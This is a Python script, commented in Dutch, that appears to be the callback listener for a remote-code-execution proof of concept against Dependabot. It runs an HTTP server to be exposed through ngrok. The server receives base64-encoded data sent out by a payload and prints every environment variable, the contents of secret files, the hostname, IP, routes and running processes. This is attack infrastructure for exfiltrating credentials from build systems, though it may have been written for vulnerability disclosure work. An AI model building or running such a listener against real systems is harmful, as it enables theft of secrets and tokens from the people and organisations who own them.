#!/usr/bin/env python3
"""
Lokale callback server voor Dependabot RCE PoC.
Gebruik ngrok of vergelijkbaar om dit publiek te maken:
  ngrok http 8888
  -> geeft https://xxxx.ngrok.io, gebruik die als COLLAB_URL in de PoC bestanden
"""
import http.server
import urllib.parse
import base64
import json
from datetime import datetime

PORT = 8888


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def _print_hit(self, path, body=None):
        parsed = urllib.parse.urlparse(path)
        params = urllib.parse.parse_qs(parsed.query)

        print("\n" + "=" * 70)
        print(f"[{datetime.now().isoformat()}] HIT ONTVANGEN")
        print(f"  Remote: {self.client_address[0]}")
        print(f"  Path:   {path}")

        poc_num = params.get("poc", ["?"])[0]
        print(f"  PoC:    Finding #{poc_num}")

        # POST body: base64(json)
        if body:
            try:
                decoded = base64.b64decode(body).decode("utf-8", errors="replace")
                data = json.loads(decoded)

                print("\n  [+] ALLE ENVIRONMENT VARIABELEN:")
                for k, v in sorted(data.get("env", {}).items()):
                    print(f"      {k} = {v}")

                print("\n  [+] SECRET FILES:")
                for path_f, content in data.get("files", {}).items():
                    if content != "NIET LEESBAAR":
                        print(f"\n  --- {path_f} ---")
                        print(f"  {content[:300]}")

                print(f"\n  [+] HOSTNAME: {data.get('hostname')}  IP: {data.get('ip')}")
                print(f"\n  [+] ROUTES:\n  {data.get('routes', '')[:300]}")
                print(f"\n  [+] PROCESSEN:\n  {data.get('procs', '')[:500]}")

            except Exception as e:
                print(f"\n  [+] RAW BODY (b64): {body[:200]}...")
                print(f"      Parse fout: {e}")

        # GET fallback met data= param
        if "data" in params:
            raw = params["data"][0]
            try:
                decoded_b64 = base64.b64decode(raw).decode(errors="replace")
                print(f"\n  [+] DATA (b64):\n  {decoded_b64[:2000]}")
            except Exception:
                print(f"\n  [+] DATA (url): {urllib.parse.unquote(raw)[:2000]}")

        if "err" in params:
            err = urllib.parse.unquote(params["err"][0])
            print(f"\n  [-] Fout in payload: {err}")
            print("      (blind ping bevestigt nog steeds code execution!)")

        print("=" * 70)

    def do_GET(self):
        self._print_hit(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else None
        self._print_hit(self.path, body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass  # suppress default logging


print(f"Callback listener draait op http://0.0.0.0:{PORT}")
print("Gebruik ngrok om publiek te maken: ngrok http 8888")
print("Wacht op Dependabot callbacks...\n")

httpd = http.server.HTTPServer(("0.0.0.0", PORT), CallbackHandler)
httpd.serve_forever()
